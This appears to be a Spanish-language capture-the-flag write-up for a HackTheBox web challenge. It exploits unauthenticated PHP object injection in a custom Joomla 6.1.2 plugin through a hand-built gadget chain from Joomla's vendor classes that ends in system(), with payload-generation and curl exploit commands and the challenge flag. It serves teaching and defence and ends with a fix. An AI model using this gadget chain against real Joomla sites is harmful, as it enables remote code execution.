# Provisioned: HackTheBox (Web / PHP Object Injection · Joomla 6.1.2)

> "Lysa Harrowmere must break into the guarded dispatch side, recover the true
> month-by-ward ledger, and bring Aeron the proof needed to expose who is
> stealing from the city."

**Flag:** `HTB{j00mla_g4dg3t_ch41n_4r3_fun_r1ght?_8f7d7d91b29eb3f094eb716aad4a645b}`

**Resuelto** con una cadena POP (gadget chain) **construida a mano** a partir de las
clases que trae Joomla 6.1.2, disparada por un `unserialize()` sin filtrar en un
plugin custom.

---

## 1. Estructura del reto

- **Joomla 6.1.2** (PHP 8.4, Apache, MariaDB) + plugin de sistema custom
  `plg_system_gatehouse` (Eastreach Provision Office).
- `readflag` SUID root: `setuid(0); system("/bin/cat /root/flag.txt")`. La flag es
  `600 root`, así que **hay que ejecutar comandos** (`/readflag`): no vale LFI puro.
- Admin de Joomla con password aleatoria de 32 chars (no fuerza bruta). El único
  camino es el plugin.

## 2. La vulnerabilidad: PHP Object Injection sin auth

`plugin/src/Extension/Gatehouse.php` engancha `onAfterRoute`:

```php
public function onAfterRoute(AfterRouteEvent $event): void
{
    $app = $event->getApplication();
    if (!$this->isAdminImportContext($app)) return;   // <-- ver abajo
    $ledger = $app->getInput()->getRaw('ledger', '');
    if (!is_string($ledger) || trim($ledger) === '') return;
    (new GatehouseRepository())->importMonthlyLedger($ledger);
}

private function isAdminImportContext($app): bool
{
    if (!$app->isClient('administrator')) return false; // NO es auth: solo /administrator
    $input = $app->getInput();
    return $input->getCmd('option') === 'com_provision'
        && $input->getCmd('view')   === 'dispatch'
        && $input->getCmd('task')   === 'ledger.import';
}
```

`isClient('administrator')` sólo comprueba que la petición va al app *administrator*
(la ruta `/administrator/index.php`), **no** que estés autenticado. `onAfterRoute`
de un system plugin se ejecuta antes de cualquier ACL de componente.

Y el sink, en `GatehouseRepository::importMonthlyLedger`:

```php
$data = @unserialize($ledger);          // <-- POI: input crudo del atacante
if (!is_array($data)) { return ...; }
```

**Trigger (sin autenticación):**

```
POST /administrator/index.php?option=com_provision&view=dispatch&task=ledger.import
Content-Type: application/x-www-form-urlencoded

ledger=<objeto PHP serializado>
```

El objeto no es array ⇒ la función devuelve "rejected", pero al salir de scope el
objeto se destruye ⇒ **`__destruct` dispara la cadena**.

## 3. Por qué no sirven las cadenas conocidas

Joomla 6.1.2 viene **endurecido/recortado** a propósito:

| Gadget clásico | Estado aquí |
|---|---|
| `Joomla/FW1` (FormattedtextLogger, file write) | **Parcheado en 5.2.2**: `__wakeup()` lanza excepción si `defer && deferredEntries` (justo la combinación que necesita `__destruct` para escribir). Airtight. |
| Monolog RCE | **No está** (Joomla usa su propio Log). |
| Guzzle `FileCookieJar` FW1 | **No está** el cliente guzzle completo (sólo psr7/promises). |
| Guzzle `FnStream` RCE | `__wakeup()` lanza `LogicException`. |
| Symfony RCE (phpggc) | Necesitan `Cache`/`Process`/`Finder`/`DI`: **ausentes** (sólo console, error-handler, http-client, ldap, string, var-dumper, yaml, validator…). |
| PHPSecLib/RCE1 | Es phpseclib **v2**; aquí es **v3** (namespace `phpseclib3`). |

⇒ Hay que **fabricar** la cadena con lo que hay.

## 4. La cadena POP (fabricada)

El eslabón final es un `call_user_func` con **ambos operandos controlados** en un
método de **0 parámetros requeridos**: `Joomla\DI\ContainerResource::getInstance()`:

```php
// libraries/vendor/joomla/di/src/ContainerResource.php
public function getInstance()
{
    $callable = $this->factory;                 // controlado
    if ($this->shared) { ... }                  // shared = false
    return $callable($this->container);         // ($this->factory)($this->container)
}
```

Con `factory = "system"` y `container = "/readflag ..."` ⇒ `system("/readflag ...")`.

Falta *disparar* `getInstance()`. Se usa el dispatcher de eventos, alcanzable desde
el destructor de un driver de BD:

```
Joomla\Database\Mysqli\MysqliDriver::__destruct()
  -> disconnect()                       // connection=null => salta el close()
  -> parent::DatabaseDriver::disconnect()
       -> freeResult()                  // statement=null => no-op
       -> dispatchEvent(new ConnectionEvent('onAfterDisconnect', $this))
            -> getDispatcher()->dispatch('onAfterDisconnect', $event)
                 -> foreach ($this->listeners['onAfterDisconnect'] as $listener)
                      $listener($event);      // <-- listener = [ContainerResource, 'getInstance']
                        -> ContainerResource::getInstance()   // ignora el arg $event (0 params)
                             -> system($this->container)      // RCE
```

Claves que lo hacen funcionar:

- `Dispatcher::dispatch()` hace `foreach ($this->listeners[$name] as $listener)` y
  `$listener($event)`. `$this->listeners` normalmente es una `ListenersPriorityQueue`,
  pero un **array plano** `['onAfterDisconnect' => [[$cr,'getInstance']]]` itera igual.
- El evento (`ConnectionEvent`) se pasa como **argumento extra** a `getInstance()`, que
  tiene 0 parámetros ⇒ PHP lo ignora (método de usuario). No hace falta controlar el arg.
- `MysqliDriver` **no** tiene `__wakeup` (a diferencia de `PdoDriver`, que en `__wakeup`
  reconectaría). Ninguna de las 3 clases define `__sleep/__serialize` que estorben.
- Todas viven en `libraries/vendor/` (`joomla/database`, `joomla/event`, `joomla/di`)
  ⇒ autoload por composer, no requiere `_JEXEC`.

**Clases usadas:** `Joomla\Database\Mysqli\MysqliDriver`, `Joomla\Event\Dispatcher`,
`Joomla\DI\ContainerResource`.

## 5. Generación del payload

Se construye con **reflexión sobre las clases reales** (`gen.php`,
`newInstanceWithoutConstructor` + `ReflectionProperty::setValue`) para que el mangling
de propiedades privadas/protegidas y las propiedades de trait (`dispatcher` de
`DispatcherAwareTrait`) salgan correctos. Ejecutado en un `php:8.4-cli` montando el
árbol de Joomla:

```bash
docker run --rm -v "$PWD/joomla:/joomla" -v "$PWD/gen.php:/gen.php" php:8.4-cli \
  php /gen.php '/readflag > /var/www/html/OUT.txt 2>&1; chmod 644 /var/www/html/OUT.txt' \
  > payload.bin
```

(Como bonus, al terminar el script el `__destruct` local dispara la cadena en el
propio contenedor cli = auto-test.)

## 6. Explotación

```bash
T="http://154.57.164.76:32205"
curl -s "$T/administrator/index.php?option=com_provision&view=dispatch&task=ledger.import" \
     --data-urlencode "ledger@payload.bin"      # el payload lleva NUL bytes (mangling)
curl -s "$T/OUT.txt"                            # webroot servido estático por Apache
# -> HTB{...}
```

`readflag` (SUID root) escupe la flag; se redirige a un fichero en el webroot
(`/var/www/html`, escribible por `www-data`) y se lee por HTTP.

## 7. Ficheros

- `gen.php`: generador del payload POP (reflexión sobre clases reales).
- `payload.bin` / `payload_remote.bin`: objeto serializado (~1.1 KB, con NUL bytes).
- `challenge/`: fuentes del reto (plugin + Dockerfile) para test local.

## 8. Notas

- Verificado end-to-end en un build local del `docker-compose` antes de tocar el
  target real.
- El payload contiene **bytes NUL** (mangling de props privadas) ⇒ enviar con
  `--data-urlencode ...@fichero` (curl los codifica como `%00`).
- Fix del reto: no `unserialize()` de entrada del usuario. Usar JSON (de hecho el
  propio repositorio ya guarda en JSON en disco; el `unserialize` de `importMonthlyLedger`
  es gratuito e innecesario).
